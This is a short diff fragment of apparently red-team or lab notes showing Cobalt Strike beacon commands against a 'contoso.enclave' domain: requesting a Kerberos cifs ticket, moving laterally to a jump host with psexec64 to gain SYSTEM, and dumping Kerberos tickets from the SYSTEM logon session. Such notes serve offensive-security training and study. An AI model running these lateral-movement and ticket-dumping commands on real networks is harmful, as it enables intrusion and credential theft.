@@ -263,3 +263,6 @@ confirms that nikki green is in enclave access group!
 
 beacon> krb_asktgs /service:cifs/enc-jmp-1.contoso.enclave /targetdomain:contoso.enclave /dc:enc-dc-1.contoso.enclave /ticket:
 [04/30 20:48:08] beacon> jump psexec64 enc-jmp-1.contoso.enclave smb
+SYSTEM on enc-jmp-1
+
+[04/30 20:50:26] beacon> krb_dump /luid:3e7 /service:cifs
